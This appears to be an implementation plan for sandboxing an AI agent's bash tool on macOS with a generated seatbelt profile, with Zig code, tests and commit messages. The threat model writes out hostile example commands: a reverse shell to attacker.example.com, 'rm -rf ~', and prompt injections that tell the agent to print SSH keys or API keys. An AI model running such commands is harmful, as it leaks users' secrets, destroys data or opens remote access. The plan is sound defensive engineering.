# Bash Tool Sandbox Implementation Plan (revived 2026-05-07)

> **For Claude:** REQUIRED SUB-SKILL: Use `superpowers:executing-plans` to implement this plan task-by-task. Each task is one commit. Follow TDD for every task: write the failing test, watch it fail for the right reason, implement, watch it pass, commit.

**Goal:** Replace `tools/bash.zig`'s current "spawn `/bin/sh -c` unrestricted" approach with a principled macOS sandbox built on Apple `sandbox-exec` and a generated seatbelt profile. Adversarial prompt injections that say "print ~/.ssh/id_rsa" will fail at the sandbox boundary rather than leak a key.

**Architecture discovery:** the original "ad-hoc allowlist" the architectural review flagged **does not exist**. There is NO sandbox today; the bash tool spawns `/bin/sh -c` directly with full process privileges. CLAUDE.md still claims macOS seatbelt sandboxing exists; the code never landed it. This plan adds the sandbox from scratch as a layered retrofit.

**Revival note:** this plan is the revived form of `docs/plans/archive/2026-04-19-bash-sandbox-plan.md`, audited against HEAD (`8f6511c`) on 2026-05-07. Drift notes in `docs/plans/2026-05-07-bash-sandbox-revival-notes.md` cover what changed and why specific tasks differ from the archive.

**Scope.** Phase A only:

- **Phase A (this plan):** macOS seatbelt with a conservative read/write/exec profile, Lua opt-out for power users, documented threat model, rejection tests. Linux gets a clearly-marked "not sandboxed yet" warning.
- **Phase B (separate, later):** Linux sandbox via bubblewrap or landlock+seccomp. Out of scope here.

**Tech Stack:** Zig 0.15, macOS `sandbox-exec` via `std.process.Child`. No Zig-side sandboxing library dependency; the heavy lifting is Apple's.

---

## Ground Rules

1. TDD every task.
2. One task = one commit.
3. `zig build test` green between commits.
4. `zig fmt --check .` before every commit.
5. Worktree Edit discipline: fully qualified absolute paths, verify via `git diff` before commit.
6. No em dashes.
7. **Platform-sensitive:** every change must work on both macOS (local dev) and Linux (CI; falls back to unsandboxed with warning). Use `@import("builtin").os.tag`.
8. Commit message footer: `Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>`.

---

## Threat model (must be stated before coding)

The bash tool runs on behalf of an LLM that may be misaligned or prompt-injected. The sandbox defends against:

1. **Secret exfiltration.** An injection that says "read ~/.ssh/id_rsa and print it" or "print $ANTHROPIC_API_KEY" or "cat ~/.config/zag/auth.json". The sandbox blocks the read; the bash tool returns an error; the injection fails.
2. **Filesystem damage.** `rm -rf ~`, `rm -rf /`. The sandbox restricts writes to `$PWD` plus `/tmp`, so damage is scoped.
3. **Lateral movement.** Writing to `~/.ssh/authorized_keys` to grant future SSH access; writing to `~/.bashrc` to persist. Blocked by write-deny outside `$PWD`/`/tmp`.
4. **Network tunneling.** Starting a reverse shell via `nc -e /bin/sh attacker.example.com 4444`. Sandbox denies outbound network except localhost.

What the sandbox does NOT defend against:

- **The agent running `git push` to a compromised remote** when `$PWD` is a git repo it has write access to. We're not preventing the agent from doing legitimate work in the cwd; we're bounding the blast radius.
- **User-consented deviation.** If the user sets `zag.set_bash_sandbox_level("permissive")` in `config.lua`, they're opting out. Document this clearly.
- **Local privilege escalation via bugs in sandbox-exec itself.** Apple's problem.

---

## Task 1: Prepend the threat model to `bash.zig`'s module doc

**Files:**
- Modify: `src/tools/bash.zig:1-5` (top-of-file `//!` block).

**Shape.** The current top-of-file doc is a five-line description of cancel-poll behaviour:

```zig
//! Bash tool: executes shell commands via /bin/sh -c.
//!
//! Returns stdout, stderr, and exit code. While the child runs, polls the
//! `cancel` flag at a 50ms cadence and kills the child on request so the
//! agent can interrupt long-running commands.
```

We extend, not overwrite. The cancel-poll sentence stays; the threat model goes above it.

**Step 1: Prepend the threat model**

Replace the current `//!` block with:

```zig
//! Bash tool: execute shell commands with a sandbox.
//!
//! Threat model:
//! * Secret exfiltration: denies reads of ~/.ssh, ~/.aws, ~/.gnupg,
//!   ~/.netrc, the entire ~/.config tree (broad-deny so future zag-stored
//!   credentials at ~/.config/zag/auth.json are covered without per-path
//!   maintenance), /etc/passwd, /private/etc, /Library/Keychains.
//! * Filesystem damage: writes restricted to $PWD and /tmp; the four
//!   standard sinks (/dev/null, /dev/stdout, /dev/stderr, /dev/tty) are
//!   write-allowed as literals so normal shell scripts function.
//! * Lateral movement: ~/.ssh/authorized_keys, ~/.bashrc etc. denied by
//!   the write scope.
//! * Network tunneling: outbound network denied except loopback.
//!
//! Platform support:
//! * macOS: sandbox-exec with a generated seatbelt profile (see
//!   buildSeatbeltProfile).
//! * Linux: not yet sandboxed (see Phase B bubblewrap plan). Bash runs
//!   unconfined; users on Linux must trust their agent prompts.
//!
//! Opt-out:
//! * zag.set_bash_sandbox_level("permissive") in config.lua disables the
//!   sandbox entirely. Intended for users who audit prompts themselves.
//!   Logs a warning line on activation.
//!
//! Returns stdout, stderr, and exit code. While the child runs, polls the
//! `cancel` flag at a 50ms cadence and kills the child on request so the
//! agent can interrupt long-running commands.
```

**Step 2: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: document threat model and platform scope

The seatbelt review raised "ad-hoc allowlist"; the actual state is
that there is no allowlist at all. Before adding one, state what we
are and are not defending against so future changes have a stable
anchor.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Add the seatbelt profile builder (macOS-only, unused)

**Files:**
- Modify: `src/tools/bash.zig`.

**Step 1: Write failing tests**

Append to `src/tools/bash.zig`:

```zig
test "buildSeatbeltProfile denies ~/.ssh by default" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/test",
        .home = "/Users/test",
    });
    defer allocator.free(profile);

    try std.testing.expect(std.mem.indexOf(u8, profile, "/Users/test/.ssh") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "deny") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "/tmp/test") != null);
}

test "buildSeatbeltProfile denies ~/.config tree as a whole" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/test",
        .home = "/Users/test",
    });
    defer allocator.free(profile);

    // Broad-deny so ~/.config/zag/auth.json (and any future ~/.config/<x>)
    // are covered without per-tool maintenance.
    try std.testing.expect(std.mem.indexOf(u8, profile, "/Users/test/.config") != null);
}

test "buildSeatbeltProfile allows /tmp for scratch writes" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/home/test/project",
        .home = "/home/test",
    });
    defer allocator.free(profile);

    try std.testing.expect(std.mem.indexOf(u8, profile, "/tmp") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "file-write") != null);
}

test "buildSeatbeltProfile allows /dev for read and standard write sinks" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/x",
        .home = "/Users/x",
    });
    defer allocator.free(profile);

    // Reads under /dev allow head -c /dev/zero, scripts that read
    // /dev/urandom, etc. Writes are restricted to the four literal sinks.
    try std.testing.expect(std.mem.indexOf(u8, profile, "(allow file-read* (subpath \"/dev\"))") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "/dev/null") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "/dev/stderr") != null);
}

test "buildSeatbeltProfile denies outbound network except loopback" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/x",
        .home = "/Users/x",
    });
    defer allocator.free(profile);

    try std.testing.expect(std.mem.indexOf(u8, profile, "network-outbound") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "localhost") != null or
        std.mem.indexOf(u8, profile, "127.0.0.1") != null);
}
```

**Step 2: Run; confirm failure** (function doesn't exist yet).

**Step 3: Implement the builder**

Append:

```zig
const SeatbeltInputs = struct {
    cwd: []const u8,
    home: []const u8,
};

/// Generate a seatbelt profile (macOS sandbox-exec DSL) for one bash
/// invocation. The profile is a Scheme-like s-expression describing
/// allow/deny rules for file access, network, and process spawn. Order
/// matters: deny rules placed AFTER an allow rule for an overlapping
/// subpath override the allow.
fn buildSeatbeltProfile(allocator: std.mem.Allocator, inputs: SeatbeltInputs) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);

    try buf.appendSlice(allocator, "(version 1)\n");
    try buf.appendSlice(allocator, "(deny default)\n");
    try buf.appendSlice(allocator, "(allow process-fork)\n");
    try buf.appendSlice(allocator, "(allow process-exec)\n");
    try buf.appendSlice(allocator, "(allow signal (target self))\n");
    try buf.appendSlice(allocator, "(allow sysctl-read)\n");
    try buf.appendSlice(allocator, "(allow file-read-metadata)\n");

    // Read: cwd, home, standard system paths, and /dev (so head -c
    // /dev/zero and friends keep working under the sandbox).
    try buf.print(allocator, "(allow file-read* (subpath \"{s}\"))\n", .{inputs.cwd});
    try buf.print(allocator, "(allow file-read* (subpath \"{s}\"))\n", .{inputs.home});
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/usr\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/bin\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/opt/homebrew\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/private/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/dev\"))\n");

    // Deny secrets (ordered AFTER the home subpath so they override).
    try buf.print(allocator, "(deny file-read* (subpath \"{s}/.ssh\"))\n", .{inputs.home});
    try buf.print(allocator, "(deny file-read* (subpath \"{s}/.aws\"))\n", .{inputs.home});
    try buf.print(allocator, "(deny file-read* (subpath \"{s}/.gnupg\"))\n", .{inputs.home});
    try buf.print(allocator, "(deny file-read* (literal \"{s}/.netrc\"))\n", .{inputs.home});
    try buf.print(allocator, "(deny file-read* (subpath \"{s}/.config\"))\n", .{inputs.home});
    try buf.appendSlice(allocator, "(deny file-read* (subpath \"/Library/Keychains\"))\n");
    try buf.appendSlice(allocator, "(deny file-read* (subpath \"/private/etc/master.passwd\"))\n");

    // Write: cwd, /tmp, plus the standard /dev sinks as literals.
    try buf.print(allocator, "(allow file-write* (subpath \"{s}\"))\n", .{inputs.cwd});
    try buf.appendSlice(allocator, "(allow file-write* (subpath \"/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (subpath \"/private/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (literal \"/dev/null\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (literal \"/dev/stdout\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (literal \"/dev/stderr\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (literal \"/dev/tty\"))\n");

    // Network: loopback only.
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"localhost:*\"))\n");
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"127.0.0.1:*\"))\n");
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"::1:*\"))\n");

    return buf.toOwnedSlice(allocator);
}
```

(Replace `buf.print(allocator, ...)` with the writer-style call your local Zig needs if `ArrayList.print` is not available; the codebase already mixes `buf.writer(allocator).print(...)` in similar code, so use that form if `print` resolves there.)

**Step 4: Tests pass. Commit.**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: add seatbelt profile builder for macOS sandbox

Generates a sandbox-exec DSL profile per invocation: deny-default,
then allow the narrow set the threat model requires. Reads scoped
to cwd, home (minus secrets and the entire ~/.config tree), /dev,
and standard system paths. Writes scoped to cwd, /tmp, and the four
standard /dev sinks. Network scoped to loopback.

Not yet wired into the bash spawn; next commit threads it through
process.Child so Linux takes the unsandboxed fallback.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Wire the sandbox into `execute`

**Files:**
- Modify: `src/tools/bash.zig` (the `execute` function body, currently `:26-89`; the spawn line is `:38`).

**Step 1: Write a rejection test (macOS only)**

Append:

```zig
test "execute denies reading ~/.ssh on macOS" {
    if (builtin.os.tag != .macos) return error.SkipZigTest;

    const allocator = std.testing.allocator;

    // The agent tries to read the current user's ~/.ssh. If it works,
    // the sandbox failed. If the command returns non-zero (or stderr
    // contains "Operation not permitted"), the sandbox worked.
    const result = try execute("{\"command\":\"cat ~/.ssh/id_rsa 2>&1 || true\"}", allocator, null);
    defer allocator.free(result.content);

    // The content should NOT contain anything that looks like a key header.
    try std.testing.expect(std.mem.indexOf(u8, result.content, "BEGIN") == null);
    try std.testing.expect(std.mem.indexOf(u8, result.content, "PRIVATE KEY") == null);
}
```

(Add `const builtin = @import("builtin");` at the top of `bash.zig` if it isn't already imported.)

**Step 2: Rewrite the spawn argv**

Current spawn at `src/tools/bash.zig:38`:

```zig
var child = std.process.Child.init(&.{ "/bin/sh", "-c", input.command }, allocator);
```

Replace with the platform branch (the `permissive` path is wired in Task 4; for now branch only on `os.tag`):

```zig
const sandbox_argv: ?[]const []const u8 = switch (builtin.os.tag) {
    .macos => blk: {
        const home = std.posix.getenv("HOME") orelse "/";
        var cwd_buf: [std.fs.max_path_bytes]u8 = undefined;
        const cwd = std.fs.cwd().realpath(".", &cwd_buf) catch "/";
        const profile = try buildSeatbeltProfile(allocator, .{ .cwd = cwd, .home = home });
        defer allocator.free(profile);
        // sandbox-exec accepts the profile inline via -p<profile>; works for
        // our profile size. Allocate the argv backing in a small arena so we
        // can free profile immediately after Child.init duplicates it.
        const argv = try allocator.alloc([]const u8, 6);
        argv[0] = "/usr/bin/sandbox-exec";
        argv[1] = "-p";
        argv[2] = try allocator.dupe(u8, profile);
        argv[3] = "/bin/sh";
        argv[4] = "-c";
        argv[5] = input.command;
        break :blk argv;
    },
    else => null,
};
defer if (sandbox_argv) |argv| {
    allocator.free(argv[2]);
    allocator.free(argv);
};

var child = if (sandbox_argv) |argv|
    std.process.Child.init(argv, allocator)
else
    std.process.Child.init(&.{ "/bin/sh", "-c", input.command }, allocator);
```

The `dupe` of the profile into `argv[2]` exists because `Child.init` borrows the argv slices for the duration of `spawn`; the deferred free runs after `child.wait()` returns. If a simpler form works (e.g., letting the profile live until the function exits), prefer that; the goal is one heap-clean spawn.

On macOS: every command runs inside `sandbox-exec -p <profile> /bin/sh -c <command>`. On Linux: unchanged (unconfined, as the threat-model doc warns).

**Step 3: Re-run the existing test suite**

The pre-existing `bash truncates stdout instead of erroring on overflow` test (`src/tools/bash.zig:289-301`) shells out to `head -c 1300000 /dev/zero | tr '\\0' 'A'`. Under the deny-default profile, `/dev/zero` reads must be allowed. Task 2 already includes `(allow file-read* (subpath "/dev"))` for exactly this reason. Run:

```
zig build test 2>&1 | rg "bash truncates|denies reading"
```

Both must pass on macOS. If the truncation test fails, the `/dev` allow is missing or has the wrong syntax. Fix by inspecting the failing seatbelt profile via `std.log.debug` before fixing forward.

**Step 4: Confirm the rejection test passes** (macOS-only).

**Step 5: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: wrap shell spawn in sandbox-exec on macOS

Bash commands on macOS now spawn as:
  /usr/bin/sandbox-exec -p <profile> /bin/sh -c <command>

The profile is generated per invocation by buildSeatbeltProfile with
the current home + cwd, so the allow/deny rules reflect the user's
actual environment. Linux still runs unconfined (warned in the
threat-model doc); bubblewrap-based sandbox is a separate plan.

Adds one integration test that attempts to cat ~/.ssh/id_rsa and
confirms no PRIVATE KEY bytes surface in the output. The pre-existing
stdout truncation test still passes because the profile allows reads
under /dev (head -c /dev/zero) and writes to the four standard sinks.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Lua opt-out for power users

**Files:**
- Modify: `src/tools/bash.zig` (add `Config` struct, add module-level borrowed pointer, branch on it inside `execute`).
- Modify: `src/LuaEngine.zig` (add `bash_config: ?*tools.bash.Config = null` field; register `set_bash_sandbox_level` in the `injectZagGlobal` block at `:614-619`; implement `zagSetBashSandboxLevelFn`).
- Modify: `src/main.zig` (wire `lua_engine.bash_config = &bash_config;` near the other engine borrows at `:412-413`).

**Shape:**

- `tools.bash.Config` is a small `pub` struct with one field, `permissive: bool = false`.
- `LuaEngine` borrows a `*Config` pointer; `null` means "no config bound, default to strict" (so engine-only tests don't have to set it).
- `zag.set_bash_sandbox_level(level: string)` flips the flag. Valid values: `"strict"` and `"permissive"`. Logs a warning on `permissive`. Unknown levels raise a Lua runtime error.
- `bash.execute` reads the borrowed flag through a module-level `?*Config` pointer (set by `LuaEngine` after binding). When permissive, falls back to unsandboxed spawn.

**Step 1: Failing test (in `src/LuaEngine.zig` test block)**

```zig
test "zag.set_bash_sandbox_level(permissive) flips bash_config" {
    const allocator = std.testing.allocator;
    var engine = try LuaEngine.init(allocator);
    defer engine.deinit();

    var bash_config: bash_tool.Config = .{};
    engine.bash_config = &bash_config;

    try engine.lua.doString("zag.set_bash_sandbox_level('permissive')");
    try std.testing.expect(bash_config.permissive);

    try engine.lua.doString("zag.set_bash_sandbox_level('strict')");
    try std.testing.expect(!bash_config.permissive);
}

test "zag.set_bash_sandbox_level rejects unknown level" {
    const allocator = std.testing.allocator;
    var engine = try LuaEngine.init(allocator);
    defer engine.deinit();

    var bash_config: bash_tool.Config = .{};
    engine.bash_config = &bash_config;

    const result = engine.lua.doString("zag.set_bash_sandbox_level('yolo')");
    try std.testing.expectError(error.LuaRuntime, result);
}
```

If `bash_tool` isn't already imported in the test file, add `const bash_tool = @import("tools/bash.zig");` at the top.

**Step 2: Add `Config` to `bash.zig`**

```zig
/// Sandbox knobs reachable from Lua. The engine borrows a pointer; bash
/// reads the flag at execute time.
pub const Config = struct {
    permissive: bool = false,
};

/// Set by LuaEngine after binding so bash.execute can branch on the flag
/// without a per-call lookup. Null = strict (the safe default).
var bound_config: ?*Config = null;

pub fn bindConfig(cfg: ?*Config) void {
    bound_config = cfg;
}
```

In `execute`, replace the unconditional macOS branch with:

```zig
const permissive = if (bound_config) |c| c.permissive else false;
const sandbox_argv: ?[]const []const u8 = if (permissive) null else switch (builtin.os.tag) {
    .macos => blk: { ... }, // same as Task 3
    else => null,
};
```

**Step 3: Wire LuaEngine**

In `src/LuaEngine.zig`:

1. Add a field after `input_parser` (around `:120`):

   ```zig
   /// Borrowed pointer to the bash sandbox config struct. main.zig wires
   /// this after init; tests can set it directly. Null = bash defaults
   /// to strict (the safe path), matching the threat-model contract.
   bash_config: ?*tools_mod.bash.Config = null,
   ```

   (`tools_mod` is the existing `@import("tools.zig")` alias; if the engine doesn't expose `tools.bash`, import `bash` directly: `const bash_tool = @import("tools/bash.zig");` and use `?*bash_tool.Config`.)

2. After `init()` completes, call `bash_tool.bindConfig(self.bash_config);` so the module-level pointer matches whatever the engine holds. The simplest place: just before returning from init. If `self.bash_config` is null at that moment, the bind is a no-op until the first explicit setter runs; revisit if tests show flake.

3. Register the binding alongside the other `set_*` helpers at `:614-619`:

   ```zig
   lua.pushFunction(zlua.wrap(zagSetBashSandboxLevelFn));
   lua.setField(-2, "set_bash_sandbox_level");
   ```

4. Implement the handler near `zagSetEscapeTimeoutMsFn` (`:5057`):

   ```zig
   /// Zig function backing `zag.set_bash_sandbox_level(level)`.
   /// Valid levels: "strict" (default), "permissive" (disables sandbox,
   /// logs a warning). Unknown levels raise a Lua runtime error.
   fn zagSetBashSandboxLevelFn(lua: *Lua) !i32 {
       if (lua.typeOf(1) != .string) {
           log.warn("zag.set_bash_sandbox_level(): arg 1 must be a string", .{});
           return error.LuaError;
       }
       const level = lua.toString(1) catch {
           log.warn("zag.set_bash_sandbox_level(): arg 1 must be a string", .{});
           return error.LuaError;
       };

       _ = lua.getField(zlua.registry_index, "_zag_engine");
       const ptr = lua.toPointer(-1) catch {
           log.warn("zag.set_bash_sandbox_level(): engine pointer not set (call storeSelfPointer first)", .{});
           return error.LuaError;
       };
       lua.pop(1);
       const engine: *LuaEngine = @ptrCast(@alignCast(@constCast(ptr)));

       if (std.mem.eql(u8, level, "strict")) {
           if (engine.bash_config) |cfg| cfg.permissive = false;
       } else if (std.mem.eql(u8, level, "permissive")) {
           if (engine.bash_config) |cfg| cfg.permissive = true;
           log.warn("bash sandbox set to permissive; commands run unconfined", .{});
       } else {
           log.warn("zag.set_bash_sandbox_level: unknown level '{s}'", .{level});
           return error.LuaError;
       }
       return 0;
   }
   ```

   This matches the inline `_zag_engine` registry idiom used by `zagSetEscapeTimeoutMsFn` and `zagSetDefaultModelFn` at the same site.

**Step 4: Wire `main.zig`**

Around `src/main.zig:412-413`, alongside `lua_engine.window_manager = ...;` and `lua_engine.buffer_registry = ...;`, add:

```zig
var bash_config: tools.bash.Config = .{};
lua_engine.bash_config = &bash_config;
bash_tool.bindConfig(&bash_config);
```

(`bash_tool` is imported at the top of `main.zig` if it isn't already; if `tools.bash.Config` is reachable through the existing `tools` alias, use that.)

**Step 5: Commit**

```bash
git add src/tools/bash.zig src/LuaEngine.zig src/main.zig
git commit -m "$(cat <<'EOF'
bash: expose zag.set_bash_sandbox_level for opt-out

Users who audit their own prompts can disable the sandbox by calling
zag.set_bash_sandbox_level("permissive") in config.lua. A warning
line is logged on activation so the opt-out is visible. Unknown
levels raise a Lua runtime error.

The flag lives in a small tools.bash.Config struct, borrowed by
LuaEngine the same way input_parser is. main.zig wires the pointer
next to the other engine borrows.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Out of scope (explicit non-goals)

1. **Linux bubblewrap / landlock / seccomp sandbox.** Separate plan. Requires installing bubblewrap or relying on kernel-level primitives, both of which have non-trivial packaging stories.
2. **Per-command sandbox level.** One level per session; setting per-command is UX complexity without a clear win.
3. **Dynamic policy updates.** The profile is generated once per command from HOME and CWD; if those change mid-session (rare), the next command picks up the new values. Not hot-reloaded.
4. **Network allowlist for specific hosts.** Only loopback; allowing `api.anthropic.com` opens reverse-tunnel risk and doesn't block the threat model's "network tunneling" scenario cleanly.
5. **Mach/IPC allow-list tuning.** `sandbox-exec` with `deny default` implicitly denies Mach lookups; our profile doesn't re-enable any. If a command needs a specific Mach service (`launchctl list`, `pbpaste`), it fails. Add case-by-case if users hit real friction; don't preemptively open holes.

---

## Done when

- [ ] Threat model documented at the top of `src/tools/bash.zig`, integrated above the existing cancel-poll docstring.
- [ ] `buildSeatbeltProfile` exists and passes the five unit tests (ssh deny, `~/.config` broad-deny, `/tmp` allow, `/dev` read + standard write sinks, network-outbound loopback).
- [ ] `execute` on macOS spawns via `sandbox-exec -p <profile> /bin/sh -c ...`; Linux unchanged (unconfined warning).
- [ ] macOS rejection test: `cat ~/.ssh/id_rsa` produces no PRIVATE KEY bytes in output.
- [ ] `zag.set_bash_sandbox_level("permissive"/"strict")` Lua binding works end-to-end; unknown level raises Lua runtime error.
- [ ] Pre-existing `bash truncates stdout instead of erroring on overflow` test still passes under the sandbox (validates that `/dev/zero` reads succeed via the expanded profile).
- [ ] Pre-existing bash tests (echo, non-zero exit, cancel) still pass on both platforms.
- [ ] `zig build test` clean, `zig fmt --check .` clean, no em dashes.
- [ ] 4 commits on the branch (one per task).
- [ ] CLAUDE.md's claim that bash has macOS seatbelt sandboxing is now true.

---

## Follow-up: Linux sandbox (Phase B, separate plan)

Out of scope here. A future plan should:

1. Detect availability of `bwrap` (bubblewrap). If present, wrap commands similarly to `sandbox-exec`.
2. If `bwrap` is missing, optionally use `landlock`-based syscall filtering via a small Zig wrapper, or fall back with the same "not sandboxed; warn once" stance macOS users never hit.
3. Match the same threat model: deny secrets, scope writes to cwd+/tmp, loopback-only network.
